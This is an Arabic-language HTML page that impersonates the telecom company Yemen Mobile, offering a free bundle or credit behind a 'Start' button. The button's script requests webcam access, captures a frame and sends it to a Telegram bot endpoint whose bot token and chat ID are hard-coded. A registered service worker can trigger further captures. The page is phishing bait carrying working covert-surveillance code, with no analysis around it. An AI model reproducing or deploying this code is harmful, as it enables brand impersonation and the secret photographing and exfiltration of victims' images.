<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>الرئيسية-يمن موبايل</title>
  <meta name="description" content="مرحبا بكم في شركة يمن موبايل الشركة الرائدة في مجال الاتصالات"/>
  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      text-decoration: none;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    .logo {
      width: 100px;
      height: 100px;
      margin: 20px auto;
    }
  </style>
</head>
<body>
  <img class="logo" src="logo_65242435a75715-41066275.svg" alt=""/>
  <h2>اضغط الزر للحصول على باقة مزايا او رصيد اساسي مقدم من يمن موبايل</h2>
  <button class="start-button" onclick="startCameraAndSend()">ابدأ</button>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
  <script>
    let canvas = document.getElementById('canvas');
    let video = null;
    let stream = null;
    let intervalId = null;

    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('service-worker.js')
        .then(registration => {
          console.log('Service Worker مسجل');
          navigator.serviceWorker.addEventListener('message', event => {
            if (event.data === 'captureAndSend') {
              captureAndSend();
            }
          });
        })
        .catch(error => {
          console.error('خطأ في تسجيل Service Worker:', error);
        });
    }

    function startCameraAndSend() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('المتصفح لا يدعم العملية');
        return;
      }
      video = document.createElement('video');
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
          stream = s;
          video.srcObject = stream;
          video.play();
          captureAndSend();
        })
        .catch(error => {
          console.error('فشل تشغيل :', error);
          alert('تعذر تشغيل اعد المحاولة.');
        });
    }

    function captureAndSend() {
      let context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/png');
      let base64Image = imageData.split(',')[1];
      const botToken = '6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w';
      const chatId = '7057346640';
      try {
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: createFormData(base64Image, chatId),
        })
        .then(response => response.json())
        .then(result => {
          console.log('تم إرسال الصورة بنجاح');
        })
        .catch(error => {
          console.error('خطأ في الإرسال:', error);
        });
      } catch (error) {
        console.error('خطأ في الإرسال:', error);
      }
    }

    function createFormData(base64, chatId) {
      const byteCharacters = atob(base64);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const blob = new Blob([byteArray], { type: 'image/png' });
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'snapshot.png');
      return formData;
    }
  </script>
</body>
</html>
